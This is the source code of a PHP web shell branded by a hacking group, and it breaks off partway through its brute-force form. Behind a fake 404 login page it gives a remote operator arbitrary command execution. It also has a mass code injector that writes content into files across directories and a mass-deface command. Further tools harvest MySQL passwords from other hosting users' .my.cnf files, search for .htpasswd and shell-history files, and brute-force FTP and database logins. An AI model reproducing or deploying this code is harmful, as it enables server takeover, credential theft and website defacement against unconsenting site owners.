<?php
$auth_pass = "6c180142336506ce970cd966abfaa8c8"; //   Modified by buth~double_E 
$color = "white;text-shadow:blue 0px 0px 10px";
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
    header('HTTP/1.0 404 Not Found');
    exit;
}
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('display_errors',0);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', 'Ver Priv~88');
if( get_magic_quotes_gpc() ) {
    function stripslashes_array($array) {
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
    }
    $_POST = stripslashes_array($_POST);
}
function printLogin() {
    echo '
<html>
<head>
            <title>buth~double_E</title>
                <!-- GOV FUCK  -->
                    <!-- Never Break my Soul -->
                        <!-- Modified by buth~double_E , LulzSec_MM -->
<!-- 
. /$$                 /$$            /$$$$$$                        |\      /|
.| $$                | $$           /$$__  $$                       |$\    /$|
.| $$       /$$   /$$| $$ /$$$$$$$$| $$  \__/  /$$$$$$   /$$$$$$$   |$$\  /$$|
.| $$      | $$  | $$| $$|____ /$$/|  $$$$$$  /$$__  $$ /$$_____/   |$$$\/$$$|
.| $$      | $$  | $$| $$   /$$$$/  \____  $$| $$$$$$$$| $$         |        |
.| $$      | $$  | $$| $$  /$$__/   /$$  \ $$| $$_____/| $$         |        |
.| $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$.$  |$$    $$|
.|________/ \______/ |__/|________/ \______/  \_______/ \_______/___|__    __|
                          //Laughing at your security since 2009! -->
<meta name="description" content="GOV FUCK, 404 not found" />
<meta name="keywords" content="GOV FUCK" />
<meta name="author" content="GOV FUCK" />
<meta name="copyright" content="GOV FUCK" />
<meta name="application-name" content="404 not found" />

</head>
<body bgcolor="black">
<style type="text/css"> 
   #greets { 
   width: 820px;
   border-style: outset;    } 
   #footer {        font-size: 9pt;         opacity: .7;    } 
   .glow {      text-shadow: 0 0 10px #F59700;      font-family: "Black Ops One";   }
   .blueglow {      text-shadow: 0 0 10px #0F6FBD;      font-family: "Black Ops One"    }
   .whiteglow {         text-shadow: 0 0 10px #FFFFFF;      font-family: "Black Ops One";   } </style>
   <center>
<p align="center"><b><font color="#a2b594" face="stencil" size="12">HackeD By LulzSec_MM</b></font></p>
<p align="center"><b><font color="white" face="stencil" size="6">Talk is Cheap .
<br/>Show Me The Code!<br/></font></p>
<p align="center"><b><font color="white" face="Times New Roman" size="6"> PwneD by MyanmarElectronicArmy </font></p>

<pre style="color:#4aad15;text-shadow:blue 0px 0px 10px">





































































<!-- 
. /$$                 /$$            /$$$$$$                        |\      /|
.| $$                | $$           /$$__  $$                       |$\    /$|
.| $$       /$$   /$$| $$ /$$$$$$$$| $$  \__/  /$$$$$$   /$$$$$$$   |$$\  /$$|
.| $$      | $$  | $$| $$|____ /$$/|  $$$$$$  /$$__  $$ /$$_____/   |$$$\/$$$|
.| $$      | $$  | $$| $$   /$$$$/  \____  $$| $$$$$$$$| $$         |        |
.| $$      | $$  | $$| $$  /$$__/   /$$  \ $$| $$_____/| $$         |        |
.| $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$.$  |$$    $$|
.|________/ \______/ |__/|________/ \______/  \_______/ \_______/___|__    __| 
                          //Laughing at your security since 2009! -->

</pre>

<p align="center"><b><font color="white" face="Times New Roman" size="6"> <small>We are Here</small> </font></p>
<pre style="color:white">
  New Security Comes with New vulnerability
                            - LulzSec_MM
</pre>
<h3 style="color:white"><u>Team Member</u></h3>
<div id="greets">
<marquee class="glow" style="color:white";>|buth~double_E | All MM Hackers |</marquee>
</div>
</center>
</body>
</html>

 <style>input { margin:5;background-color:#000;border:none;color:#0000; cursor:arrow; }</style>
          <center><form method=post><input type=password name=pass></form>
</body> 
    ';
    exit;
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
    if( empty( $auth_pass ) ||
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        printLogin();
if( strtolower( substr(PHP_OS,0,3) ) == "win" )
    $os = 'win';
else
    $os = 'nix';
$safe_mode = @ini_get('safe_mode');
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if( isset( $_POST['c'] ) )
    @chdir($_POST['c']);
$cwd = @getcwd();
if( $os == 'win') {
    $home_cwd = str_replace("\\", "/", $home_cwd);
    $cwd = str_replace("\\", "/", $cwd);
}
if( $cwd[strlen($cwd)-1] != '/' )
    $cwd .= '/';
if($os == 'win') {
    $aliases = array(
        "Mass Deface" => 'for /r "%cd%" %i in (.) do @copy "%cd%\Lulzsec.html" "%i"',
        "Find index.php in current dir" => "dir /s /w /b index.php",
        "Find *config*.php in current dir" => "dir /s /w /b *config*.php",
        "Show active connections" => "netstat -an",
        "Show running services" => "net start",
        "User accounts" => "net user",
        "Show computers" => "net view",
        "ARP Table" => "arp -a",
        "IP Configuration" => "ipconfig /all"
    );
} else {
    $aliases = array(
          "List dir" => "ls -la",
        "list file attributes on a Linux second extended file system" => "lsattr -va",
          "show opened ports" => "netstat -an | grep -i listen",
        "Find" => "",
          "find all suid files" => "find / -type f -perm -04000 -ls",
          "find suid files in current dir" => "find . -type f -perm -04000 -ls",
          "find all sgid files" => "find / -type f -perm -02000 -ls",
          "find sgid files in current dir" => "find . -type f -perm -02000 -ls",
          "find config.inc.php files" => "find / -type f -name config.inc.php",
          "find config* files" => "find / -type f -name \"config*\"",
          "find config* files in current dir" => "find . -type f -name \"config*\"",
          "find all writable folders and files" => "find / -perm -2 -ls",
          "find all writable folders and files in current dir" => "find . -perm -2 -ls",
          "find all service.pwd files" => "find / -type f -name service.pwd",
          "find service.pwd files in current dir" => "find . -type f -name service.pwd",
          "find all .htpasswd files" => "find / -type f -name .htpasswd",
          "find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
          "find all .bash_history files" => "find / -type f -name .bash_history",
          "find .bash_history files in current dir" => "find . -type f -name .bash_history",
          "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
          "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
        "Locate" => "",
          "locate httpd.conf files" => "locate httpd.conf",
        "locate vhosts.conf files" => "locate vhosts.conf",
        "locate proftpd.conf files" => "locate proftpd.conf",
        "locate psybnc.conf files" => "locate psybnc.conf",
        "locate my.conf files" => "locate my.conf",
        "locate admin.php files" =>"locate admin.php",
        "locate cfg.php files" => "locate cfg.php",
        "locate conf.php files" => "locate conf.php",
        "locate config.dat files" => "locate config.dat",
        "locate config.php files" => "locate config.php",
        "locate config.inc files" => "locate config.inc",
        "locate config.inc.php" => "locate config.inc.php",
        "locate config.default.php files" => "locate config.default.php",
        "locate config* files " => "locate config",
        "locate .conf files"=>"locate '.conf'",
        "locate .pwd files" => "locate '.pwd'",
        "locate .sql files" => "locate '.sql'",
        "locate .htpasswd files" => "locate '.htpasswd'",
        "locate .bash_history files" => "locate '.bash_history'",
        "locate .mysql_history files" => "locate '.mysql_history'",
        "locate .fetchmailrc files" => "locate '.fetchmailrc'",
        "locate backup files" => "locate backup",
        "locate dump files" => "locate dump",
        "locate priv files" => "locate priv"    
    );
}
function ex($in) { 
    $out = ''; 
    if (function_exists('exec')) { 
        @exec($in,$out); 
        $out = @join("\n",$out); 
    } elseif (function_exists('passthru')) { 
        ob_start(); 
        @passthru($in); 
        $out = ob_get_clean(); 
    } elseif (function_exists('system')) { 
        ob_start(); 
        @system($in); 
        $out = ob_get_clean(); 
    } elseif (function_exists('shell_exec')) { 
        $out = shell_exec($in); 
    } elseif (is_resource($f = @popen($in,"r"))) { 
        $out = ""; 
        while(!@feof($f)) 
            $out .= fread($f,1024); 
        pclose($f); 
    }else return " Unable to execute command BC\n"; 
    return ($out==''?" Query did not return anything Bro\n":$out); 
} 
function which($p) { 
    $path = ex('which ' . $p); 
    if(!empty($path)) 
        return $path; 
    return false; 
}
function printHeader() {
    if(empty($_POST['charset']))
        $_POST['charset'] = "UTF-8";
    global $color;
    echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset='.$_POST['charset'].'"><title>buth~double_E '.VERSION.'</title>
    <style>
            // background url here 
        body {background:url(http://i.imgur.com/vxzuzvS.jpg); color:#C3C3C3;} 
        body,td,th    { font: 9pt Lucida,Verdana;margin:0;vertical-align:top; }
        span,h1,a    { color:'.$color.' !important; }
        span        { font-weight: bolder; }

        h1            { padding: 2px 5px;font: 14pt Verdana;margin:0px 0 0 5px; }
        div.content    { padding: 5px;margin:0 5px;background: #213939;border-bottom:1px #56A3E9;}
        a            { text-decoration:none; }
        a:hover        { /*background:lime;*/ }
        .ml1        { border:1px  #396c6c;padding:5px;margin:0;overflow: auto; }
        .bigarea    { width:100%;height:250px;margin-top:5px;}
        input, textarea, select    { margin:0;color:lime;background-color:#000000;border:1px solid '.$color.'; font: 9pt Monospace,"Courier New"; }
        input[type="button"]:hover,input[type="submit"]:hover {background-color:'.$color.';color:#000;} 
        form        { margin:0px; }
        #toolsTbl    { text-align:center; }
        .toolsInp    { width: 80%; }
        .main th    {text-align:left;background-color:#000000;font-weight: bold;}
        .main tr:hover{background-color:#5e5e5e;}
        .main td, th{vertical-align:middle;}
        .menu {background: #000;}
        .menu th{padding:5px;font-weight:bold;}
        .menu th:hover{background:#444;}
        .l1 {background-color:#000}
        pre {font-family:Courier,Monospace;}
        #cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);}
        .logo {text-align:center;font-size:60px;}
        .logo sup {font-size: 15px;vertical-align: top;margin-left: -14px;}
        .cpr {margin-bottom:5px;font-weight:bold;}
        .cpb {width:34px;margin:0 5px;}
        .eca1 {font-size: 16px;font-weight: bold;letter-spacing: 10px;margin: 0 2px 0 17px;text-align: center;}
        .eca2 {font-size: 13px;font-weight: bold;letter-spacing: 3px;margin: 0 2px 0 7px;text-align: center;}
        .npoad td {padding:0;}
    </style>
    <script>
        function set(a,c,p1,p2,p3,charset) {
            if(a != null)document.mf.a.value=a;
            if(c != null)document.mf.c.value=c;
            if(p1 != null)document.mf.p1.value=p1;
            if(p2 != null)document.mf.p2.value=p2;
            if(p3 != null)document.mf.p3.value=p3;
            if(charset != null)document.mf.charset.value=charset;
        }
        function g(a,c,p1,p2,p3,charset) {
            set(a,c,p1,p2,p3,charset);
            document.mf.submit();
        }
        function a(a,c,p1,p2,p3,charset) {
            set(a,c,p1,p2,p3,charset);
            var params = "ajax=true";
            for(i=0;i<document.mf.elements.length;i++)
                params += "&"+document.mf.elements[i].name+"="+encodeURIComponent(document.mf.elements[i].value);
            sr("'.$_SERVER['REQUEST_URI'].'", params);
        }
        function sr(url, params) {    
            if (window.XMLHttpRequest) {
                req = new XMLHttpRequest();
                req.onreadystatechange = processReqChange;
                req.open("POST", url, true);
                req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
                req.send(params);
            } 
            else if (window.ActiveXObject) {
                req = new ActiveXObject("Microsoft.XMLHTTP");
                if (req) {
                    req.onreadystatechange = processReqChange;
                    req.open("POST", url, true);
                    req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
                    req.send(params);
                }
            }
        }
        function processReqChange() {
            if( (req.readyState == 4) )
                if(req.status == 200) {
                    //alert(req.responseText);
                    var reg = new RegExp("(\\d+)([\\S\\s]*)", "m");
                    var arr=reg.exec(req.responseText);
                    eval(arr[2].substr(0, arr[1]));
                } 
                else alert("Request error!");
        }
    </script>
    <head><body><div style="position:absolute;width:100%;top:0;left:0;"><div style="margin:1px;background:#000;"><div class="content" style="border-top:1px  #56A3E9;">
    <form method=post name=mf style="display:none;">
        <input type=hidden name=a value="'.(isset($_POST['a'])?$_POST['a']:'').'">
        <input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
        <input type=hidden name=p1 value="'.(isset($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'">
        <input type=hidden name=p2 value="'.(isset($_POST['p2'])?htmlspecialchars($_POST['p2']):'').'">
        <input type=hidden name=p3 value="'.(isset($_POST['p3'])?htmlspecialchars($_POST['p3']):'').'">
        <input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
    </form>';
    $freeSpace = @diskfreespace($GLOBALS['cwd']);
    $totalSpace = @disk_total_space($GLOBALS['cwd']);
    $totalSpace = $totalSpace?$totalSpace:1;
    $disable_functions = @ini_get('disable_functions');
    $release = @php_uname('r');
    $kernel = @php_uname('s');
    $explink = 'http://exploit-db.com/search/?action=search&filter_description=';
    if(strpos('Linux', $kernel) !== false)
        $explink .= urlencode('Linux Kernel ' . substr($release,0,6));
    else
        $explink .= urlencode($kernel . ' ' . substr($release,0,3));
    if(!function_exists('posix_getegid')) {
        $user = @get_current_user();
        $uid = @getmyuid();
        $gid = @getmygid();
        $group = "?";
    } else {
        $uid = @posix_getpwuid(@posix_geteuid());
        $gid = @posix_getgrgid(@posix_getegid());
        $user = $uid['name'];
        $uid = $uid['uid'];
        $group = $gid['name'];
        $gid = $gid['gid'];
    }
    $cwd_links = '';
    $path = explode("/", $GLOBALS['cwd']);
    $n=count($path);
    for($i=0;$i<$n-1;$i++) {
        $cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
        for($j=0;$j<=$i;$j++)
            $cwd_links .= $path[$j].'/';
        $cwd_links .= "\")'>".$path[$i]."/</a>";
    }
    $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
    $opt_charsets = '';
    foreach($charsets as $item)
        $opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';
    $m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Exec'=>'Console','Infect'=>'Infect','CgiShell'=>'CgiShell','Shared Hostings'=>'Shared','Grab Configs'=>'ConfigGrabber','Safe Mode'=>'Bypass','Sql'=>'Sql','Subdomain'=>'Subdomain','LFI'=>'lfiscan','Brute'=>'Bruteforce','CP' => 'CP','Readable'=>'Readable','Mass Defacer'=>'Deface','Bypass'=>'Defacer','String tools'=>'StringTools','Jumping'=>'Jumping','Injector'=>'Injector','Connect'=>'Network','Port Scanner'=>'PortScanner','NOT yet'=>'rdp','NOT yet' => 'Domain','Mass SQLi' => 'shiv');
    if(!empty($GLOBALS['auth_pass']))
    $m['Logout'] = 'Logout';
  
    $menu = '';
    foreach($m as $k => $v)
        $menu .= '<th><a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a></th>';
    $drives = "";
    if ($GLOBALS['os'] == 'win') {
        foreach( range('a','z') as $drive ){
            if (is_dir($drive.':\\'))
                $drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
        }
        $drives .= '<br />: ';
        
    }
    if($GLOBALS['os'] == 'nix') {
        $dominios = @file_get_contents("/etc/named.conf");
        if(!$dominios) {
            $d0c = "CANT READ named.conf";
        } else {
            @preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);
            $out = sizeof(array_unique($out[1]));
            $d0c = $out."  Domains";
        }
    } else {
        $d0c = " --- ";
    }
    if($GLOBALS['os'] == 'nix' )
    {
        $usefl = ''; $dwnldr = '';
        if(!@ini_get('safe_mode')) {
            $temp = array();
            $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
            foreach($userful as $item) { if(which($item)) $temp[]= $item; }
            $usefl = implode(', ',$temp);
            $temp = array();
            $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
            foreach($downloaders as $item2) { if(which($item2)) $temp[]= $item2; }
            $dwnldr = implode(', ',$temp);
        } else {
            $usefl = ' ------- '; $dwnldr = ' ------- ';
        }
    } else { 
        $usefl = ' ------- '; $dwnldr = ' ------- ';
    } 
    
    echo '<table class="info" cellpadding="0" cellspacing="0" width="100%" bgcolor="#5f8e7b"><tr><td width="160px"><img src="http://i.imgur.com/zBtApYV.png" height="150" width="300px"><sup>&reg;</sup></div></td>
        <hr>
          <td><table cellpadding="0" cellspacing="0" class="npoad"><tr><td width="125px;"><span>Uname</span></td><td>: <nobr>'.substr(@php_uname(), 0, 120).' <a href="' . $explink . '" target=_blank>[exploit-db.com]'.'</nobr></td></tr>
          <tr><td><span>User</span></td><td>: '.$uid.' ( '.$user.' ) <span>Group : </span> '.$gid.' ( '.$group.' )</td></tr><tr><td><span>Server</span></td><td>: '.@getenv('SERVER_SOFTWARE').'</td></tr><tr><td><span>Useful</span></td><td>: '.$usefl.'</td></tr><tr><td><span>Downloaders</span></td><td>: '.$dwnldr.'</td></tr><tr><td><span>Disabled functions</span></td><td>: '.($disable_functions?$disable_functions:'All Function Enable').'</td></tr><tr><td><span>'.($GLOBALS['os'] == 'win'?'Drives<br />Cwd':'Cwd').'</span></td><td>: '.$drives.''.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a></td></tr></table></td>'.
         '<td width=1><nobr><span>Server IP</span><br><span>Client IP</span><br /><span>HDD</span><br /><span>Free</span><br /><span>PHP</span><br /><span>Safe Mode</span><br /><span>Domains</span></nobr></td>'.
         '<td><nobr>: '.gethostbyname($_SERVER["HTTP_HOST"]).'<br>: '.$_SERVER['REMOTE_ADDR'].'<br />: '.viewSize($totalSpace).'<br />: '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)<br>: '.@phpversion().' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a><br />: '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color='.$color.'<b>OFF</b></font>').'<br />: '.$d0c.'</nobr></td></tr></table>'.
         '</div></div><div style="margin:1;background #000;"><div class="content" style="border-top:1px  #56A3E9;padding:2px;"><table cellpadding="3" cellspacing="0" width="100%" class="menu"><tr>'.$menu.'.</tr></table></div></div><div style="margin:2;background:#000;">'
         .'<div style="margin:1;background #000;"><div class="content" style="border-top:1px  #56A3E9;padding:2px;">';
                            // menu22222222 is there but cant set it. Bro :v
         }


function actionInjector(){
    printHeader();
    echo '<center><h1>Mass Code Injector By LulzSec_MM 2017 </h1></center>';
    echo '<div class="content">';
    
    if(stristr(php_uname(),"Windows")) { $DS = "\\"; } else if(stristr(php_uname(),"Linux")) { $DS = '/'; }
    function get_structure($path,$depth) {
        global $DS;
        $res = array();
        if(in_array(0, $depth)) { $res[] = $path; }
        if(in_array(1, $depth) or in_array(2, $depth) or in_array(3, $depth)) {
            $tmp1 = glob($path.$DS.'*',GLOB_ONLYDIR);
            if(in_array(1, $depth)) { $res = array_merge($res,$tmp1); }
        }
        if(in_array(2, $depth) or in_array(3, $depth)) {
            $tmp2 = array();
            foreach($tmp1 as $t){
                $tp2 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp2 = array_merge($tmp2, $tp2);
            }
            if(in_array(2, $depth)) { $res = array_merge($res,$tmp2); }
        }
        if(in_array(3, $depth)) {
            $tmp3 = array();
            foreach($tmp2 as $t){
                $tp3 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp3 = array_merge($tmp3, $tp3);
            }
            $res = array_merge($res,$tmp3);
        }
        return $res;
    }

    if(isset($_POST['submit']) && $_POST['submit']=='Inject') {
        $name = $_POST['name'] ? $_POST['name'] : '*';
        $type = $_POST['type'] ? $_POST['type'] : 'html';
        $path = $_POST['path'] ? $_POST['path'] : getcwd();
        $code = $_POST['code'] ? $_POST['code'] : '3xp1r3 Cyber Army';
        $mode = $_POST['mode'] ? $_POST['mode'] : 'a';
        $depth = sizeof($_POST['depth']) ? $_POST['depth'] : array('0');
        $dt = get_structure($path,$depth);
        foreach ($dt as $d) {
            if($mode == 'a') {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code, FILE_APPEND)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:#a3e956;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            } else {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:#a3e956;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            }        
        }
    } else {
        echo '<form method="post" action="">
                <table align="center">
                    <tr>
                        <td>Directory : </td>
                        <td><input class="box" name="path" value="'.getcwd().'" size="50"/></td>
                    </tr>
                    <tr>
                        <td class="title">Mode : </td>
                        <td>
                            <select style="width: 100px;" name="mode" class="box">
                                <option value="a">Apender</option>
                                <option value="w">Overwriter</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td class="title">File Name & Type : </td>
                        <td>
                            <input type="text" style="width: 100px;" name="name" value="*"/>&nbsp;&nbsp;
                            <select style="width: 100px;" name="type" class="box">
                            <option value="html">HTML</option>
                            <option value="htm">HTM</option>
                            <option value="php" selected="selected">PHP</option>
                            <option value="asp">ASP</option>
                            <option value="aspx">ASPX</option>
                            <option value="xml">XML</option>
                            <option value="txt">TXT</option>
                        </select></td>
                    </tr>
                    <tr>
                        <td class="title">Code Inject Depth : </td>
                        <td>
                            <input type="checkbox" name="depth[]" value="0" checked="checked"/>&nbsp;0&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="1"/>&nbsp;1&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="2"/>&nbsp;2&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="3"/>&nbsp;3
                        </td>
                    </tr>        
                    <tr>
                        <td colspan="2"><textarea name="code" cols="70" rows="10" class="box"></textarea></td>
                    </tr>                        
                    <tr>
                        <td colspan="2" style="text-align: center;">
                            <input type="hidden" name="a" value="Injector">
                            <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
                            <input type="hidden" name="p1">
                            <input type="hidden" name="p2">
                            <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
                            <input style="padding :5px; width:100px;" name="submit" type="submit" value="Inject"/></td>
                    </tr>
                </table>
        </form>';
    }
    echo '</div>';
    printFooter();
}


function actionCP() {

printHeader();


echo "<html>
<style type='text/css'> 
   body {       height: 100%;       width: 100%;        margin: 0;      padding: 0;         background-image: url(' '); 
   <style type='text/css'>
        /* Circle Text Styles */
        #outerCircleText {
        /* Optional - DO NOT SET FONT-SIZE HERE, SET IT IN THE SCRIPT */
        font-style: italic;
        font-weight: bold;
        font-family: 'comic sans ms', verdana, arial;
        color: #FFF;
        /* End Optional */
         
        /* Start Required - Do Not Edit */
        position: absolute;top: 0;left: 0;z-index: 3000;cursor: default;}
        #outerCircleText div {position: relative;}
        #outerCircleText div div {position: absolute;top: 0;left: 0;text-align: center;}
        /* End Required */
        /* End Circle Text Styles */
        </style>


<center><marquee bgcolor='black' width='30%'><span style='font-size: 25px;'><b>
<span style='color:White;font-family:Iceland;text-shadow:red 0px 0px 5px' 'font-size:='' 20pt;'=''>Powered by LulzSec MM</span></marquee></center>
<body>";

@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
 echo "<center>";
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
 
if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();
 
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a href='http://".$domain.":2082' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
}
 
}
}
echo '</table>';
$total = $dc;
echo '<br><div class="result">Total Found = '.$total.'</h3><br />';
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td><td>".$password."</td><td><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
                                }
            }
                        }
echo '</table>';
$total = $dc;
echo '<br><div class="result">Total Found = '.$total.'</h3><br />';
echo '</center>';
 
}
}else{
echo "<h3><div class='result'><i><font style='color:White;font-family:Iceland;text-shadow:blue 0px 0px 5px'>ERROR</font><br><font style='color:White;font-family:Iceland;text-shadow:blue 0px 0px 5px'>/var/named</font> or <font style='color:White;font-family:Iceland;text-shadow:blue 0px 0px 5px'>etc/named.conf</font> Not Accessible!</i></div></h3>";
echo "<h3><div class='result'><i><font style='color:White;font-family:Iceland;text-shadow:blue 0px 0px 5px'>Lulzsec_MM </font></h3>";

}
  printFooter();
 }

function actionBruteforce() {
    printHeader();
    if( isset($_POST['proto']) ) {
        echo '<h1>Results</h1><div class=content><span>Type:</span> '.htmlspecialchars($_POST['proto']).' <span>Server:</span> '.htmlspecialchars($_POST['server']).'<br>';
        if( $_POST['proto'] == 'ftp' ) {
            function bruteForce($ip,$port,$login,$pass) {
                $fp = @ftp_connect($ip, $port?$port:21);
                if(!$fp) return false;
                $res = @ftp_login($fp, $login, $pass);
                @ftp_close($fp);
                return $res;
            }
        } elseif( $_POST['proto'] == 'mysql' ) {
            function bruteForce($ip,$port,$login,$pass) {
                $res = @mysql_connect($ip.':'.$port?$port:3306, $login, $pass);
                @mysql_close($res);
                return $res;
            }
        } elseif( $_POST['proto'] == 'pgsql' ) {
            function bruteForce($ip,$port,$login,$pass) {
                $str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=''";
                $res = @pg_connect($server[0].':'.$server[1]?$server[1]:5432, $login, $pass);
                @pg_close($res);
                return $res;
            }
        }
        $success = 0;
        $attempts = 0;
        $server = explode(":", $_POST['server']);
        if($_POST['type'] == 1) {
            $temp = @file('/etc/passwd');
            if( is_array($temp) )
                foreach($temp as $line) {
                    $line = explode(":", $line);
                    ++$attempts;
                    if( bruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) {
                        $success++;
                        echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>';
                    }
                    if(@$_POST['reverse']) {
                        $tmp = "";
                        for($i=strlen($line[0])-1; $i>=0; --$i)
                            $tmp .= $line[0][$i];
                        ++$attempts;
                        if( bruteForce(@$server[0],@$server[1], $line[0], $tmp) ) {
                            $success++;
                            echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp);
                        }
                    }
                }
        } elseif($_POST['type'] == 2) {
            $temp = @file($_POST['dict']);
            if( is_array($temp) )
                foreach($temp as $line) {
                    $line = trim($line);
                    ++$attempts;
                    if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {
                        $success++;
                        echo '<b>'.htmlspecialchars($_POST['login']).'</b>:'.htmlspecialchars($line).'<br>';
                    }
                }
        }
        echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
    }
    echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>'
        .'<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>'
        .'<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">'
        .'<input type=hidden name=a value="'.htmlspecialchars($_POST['a']).'">'
        .'<input type=hidden name=charset value="'.htmlspecialchars($_POST['charset']).'">'
        .'<span>Server:port</span></td>'
